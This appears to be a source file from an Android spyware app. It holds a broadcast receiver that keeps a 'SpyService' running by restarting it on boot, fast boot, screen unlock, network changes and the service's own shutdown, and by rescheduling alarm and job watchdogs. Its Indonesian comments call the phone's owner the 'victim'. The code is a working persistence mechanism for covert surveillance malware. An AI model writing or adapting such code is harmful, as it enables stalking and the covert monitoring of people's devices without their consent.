package com.nullx.pp;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * RestarterReceiver — multi-trigger restart chain.
 *
 * Dipanggil oleh:
 * 1. BOOT_COMPLETED — restart setelah HP nyala
 * 2. QUICKBOOT_POWERON — restart setelah fastboot
 * 3. RestartSpyService — broadcast dari SpyService.onDestroy()
 * 4. USER_PRESENT — layar di-unlock korban
 * 5. CONNECTIVITY_CHANGE — koneksi internet berubah (wifi/data)
 */
public class RestarterReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        String action = intent.getAction();
        if (action == null) return;

        switch (action) {
            case Intent.ACTION_BOOT_COMPLETED:
            case "android.intent.action.QUICKBOOT_POWERON":
            case "RestartSpyService":
            case Intent.ACTION_USER_PRESENT:         // screen unlocked
            case "android.net.conn.CONNECTIVITY_CHANGE": // network change
                startAll(context);
                break;
        }
    }

    private void startAll(Context context) {
        // Start SpyService
        startSpyService(context);
        // Re-schedule AlarmManager watchdog
        SpyService.scheduleAlarmWatchdog(context);
        // Re-schedule JobScheduler
        JobSchedulerService.schedule(context);
    }

    private void startSpyService(Context context) {
        try {
            Intent i = new Intent(context, SpyService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(i);
            } else {
                context.startService(i);
            }
        } catch (Exception e) {}
    }
}
